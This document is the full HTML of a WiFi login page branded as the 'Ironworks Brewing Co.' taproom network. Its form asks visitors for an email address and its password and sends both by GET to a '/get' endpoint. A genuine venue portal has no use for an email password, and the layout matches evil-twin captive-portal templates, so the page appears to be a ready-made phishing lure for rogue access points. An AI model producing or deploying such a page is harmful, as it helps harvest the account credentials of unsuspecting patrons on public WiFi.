<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Ironworks Brewing Co. — WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#1a1208;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:400px;background:#211808;border:1px solid #3a2810;border-radius:8px;overflow:hidden;box-shadow:0 20px 50px rgba(0,0,0,0.5)}
.top{padding:28px 26px 22px;border-bottom:1px solid #3a2810;text-align:center}
.brew-name{font-size:20px;font-weight:900;color:#e0c890;letter-spacing:1.5px;text-transform:uppercase}
.brew-sub{font-size:9px;color:#6a5030;letter-spacing:2px;text-transform:uppercase;margin-top:5px}
.hops{font-size:24px;margin:10px 0}
.pill{display:inline-flex;align-items:center;gap:7px;background:rgba(255,255,255,0.04);border:1px solid #3a2810;border-radius:4px;padding:5px 12px}
.dot{width:6px;height:6px;background:#4ade80;border-radius:50%}
.pill span{font-size:11px;color:#5a4020}
.pill strong{color:#8a7040;font-weight:500}
.body{padding:24px 26px 20px}
h2{font-size:16px;font-weight:700;color:#d0b870;margin-bottom:3px}
.sub{font-size:12.5px;color:#5a4020;margin-bottom:18px}
.lbl{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:#5a4020;margin-bottom:7px;margin-top:18px}
input{width:100%;padding:11px 13px;border:1px solid #3a2810;border-radius:6px;font-size:14px;background:#1a1208;color:#d0b870}
input:focus{outline:none;border-color:#8a7040;box-shadow:0 0 0 3px rgba(138,112,64,0.12)}
input::placeholder{color:#2a1a08}
.btn{width:100%;padding:12px;margin-top:20px;border:none;border-radius:6px;background:#8a7040;color:#1a1208;font-size:13px;font-weight:800;cursor:pointer}
.terms{font-size:10.5px;color:#3a2810;text-align:center;margin-top:13px;line-height:1.6}
.terms a{color:#8a7040}
.foot{background:#1a1208;border-top:1px solid #3a2810;padding:11px 26px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:10px;color:#3a2810;text-decoration:none}
.foot a{color:#6a5030}
</style>
</head>
<body>
<div class="card">
  <div class="top">
    <div class="brew-name">Ironworks Brewing Co.</div>
    <div class="brew-sub">Craft Beer &bull; Taproom WiFi</div>
    <div class="hops">🍺</div>
    <div class="pill"><div class="dot"></div><span>Network: <strong>Ironworks-Taproom</strong></span></div>
  </div>
  <div class="body">
    <h2>Taproom WiFi</h2>
    <p class="sub">Connect and enjoy your pint while you browse.</p>
    <form action="/get">
      <label class="lbl">Email Address</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <button type="submit" class="btn">Connect</button>
      <p class="terms">Must be 21+ to enter. By connecting you agree to our <a href="#">Terms</a>.</p>
    </form>
  </div>
  <div class="foot"><span>&copy; Ironworks Brewing Co.</span><a href="#">Help</a></div>
</div>
</body>
</html>
